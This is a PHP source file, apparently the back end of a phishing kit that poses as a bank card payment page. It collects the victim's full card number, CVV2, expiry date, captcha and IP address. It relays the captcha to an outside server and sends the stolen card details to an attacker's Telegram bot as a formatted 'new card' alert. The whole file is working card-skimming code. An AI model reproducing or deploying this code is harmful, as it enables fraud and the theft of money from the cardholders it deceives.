<?php
session_start();

if(!is_dir('data_code'))
{
    mkdir('data_code');
}

include "functions.php";
include "info.php";

header("Content-Type: application/json");
if (isset($_SESSION['card'])) {
    $input = file_get_contents("php://input");
    $json = json_decode($input, true);

    $panchek = strlen($json["pan"]);
    if ($panchek == '16') {
        $pan = $json["pan"];
    }

    $cvvchek = strlen($json["cvv2"]);
    if ($cvvchek == '3' || $cvvchek == '4') {
        $cvv = $json["cvv2"];
    }

    $yearchek = strlen($json["year"]);
    if ($yearchek == '2') {
        $year = $json["year"];
    }
    $monthchek = strlen($json["month"]);
    if ($monthchek == '2') {
        $month = $json["month"];
    }

    $captchachek = strlen($json["captcha"]);
    if ($captchachek == '5') {
        $captcha = $json["captcha"];
    }
    $i = strlen($json["code"]);
    if ($i == '16') {
        $refid = $json["code"];
    }

    if (isset($pan) && isset($cvv) && isset($year) && isset($month) && isset($captcha)) {
        $data = array(
            'refid' => $refid,
            'cardnumber' => $pan,
            'captcha' => $captcha
        );
        $pa = curl_init();
        curl_setopt($pa, CURLOPT_URL , "$apiurl/telgram/poya.php?refid=$refid&pan=$pan&captcha=$captcha");
        curl_setopt($pa,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($pa,CURLOPT_POST,true);
        curl_setopt($pa,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($pa,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($pa,CURLOPT_POSTFIELDS,$data);
        $payresult = curl_exec($pa);
        $s = json_decode($payresult,true);
        $res = $s['status'];
        if ($res != 'INVALID_CAPTCHA') {
            if (info($pan)[0] != false) {
                $cardinfo = info($pan);
                include "time.php";
                $pan1 = substr($pan, 0, 4);
                $pan2 = substr($pan, 4, -8);
                $pan3 = substr($pan, 8, -4);
                $pan4 = substr($pan, 12);
                $cardn = substr($pan, 0, -10);
                function getUserIP()
                {
                    $client = @$_SERVER['HTTP_CLIENT_IP'];
                    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
                    $remote = $_SERVER['REMOTE_ADDR'];
                    if (filter_var($client, FILTER_VALIDATE_IP)) {
                        $ip = $client;
                    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
                        $ip = $forward;
                    } else {
                        $ip = $remote;
                    }
                    return $ip;
                }

                $ip = getUserIP();
                
                if(!file_exists('data_code/' . $pan . '.txt'))
                {
                    file_put_contents('data_code/' . $pan . '.txt', 'true');
                }

                $Text = "╔═━──━▒   𝙾𝚃𝙿  𝙸𝙽𝙵𝙾  ▒━──━═╗
║      ✧ ℕ𝔼𝕎 ℂ𝔸ℝ𝔻 ℝ𝔼ℂ𝔼𝕀𝕍𝔼 ✧ 
╠━──━━──━─────━──━━──━
║🏦 #вΔ𝔫𝐊 ➠ $cardinfo[1]
╚═━──━━──━───━──━━──━═╝
╔═━─━▒ ༒ℂ𝓐𝔯𝐝 ιηℱ𝓞༒ ▒━─━═╗
║🎴 ᴄᴀʀᴅ  ➠ <code>$pan1$pan2$pan3$pan4</code>
║⌨️ ᴘᴀꜱꜱ  ➠  <code>🅂🄴🄽🄳</code>
║🗝 𝙲𝚅𝚅𝟸 ➠  <code>$cvv</code>
║📅 𝙳𝙰𝚃𝙴 ➠  <code>$year</code> <code>$month</code>
╚═━──━━──━───━──━━──━═╝
╔═━──━▒  𝙽𝙴𝚇𝚃  𝙸𝙽𝙵𝙾  ▒━──━═╗
║🌐 🄸🄿         ➠ <code>$ip</code>
║📂 🄳🄰🅃🄴  ➠ $tarikh
║⌚️ 🅃🄸🄼🄴  ➠ $saat
╚═━──━▒  #𝙾𝚃𝙿_𝙸𝙽𝙵𝙾   ▒━──━═╝
";

                file_get_contents("https://api.telegram.org/bot$Token/sendMessage?parse_mode=HTML&chat_id=$Id&text=" . urlencode($Text));

                echo '{"status":"OK"}';

                session_unset();
                session_start();
                $_SESSION['card-main'] = "fuckyou";


            } else {
                echo '{"status":"INVALID_PAN"}';
            }

        } else {
            echo '{"status":"INVALID_CAPTCHA"}';
        }
    } else {

    }
} else {

}
?>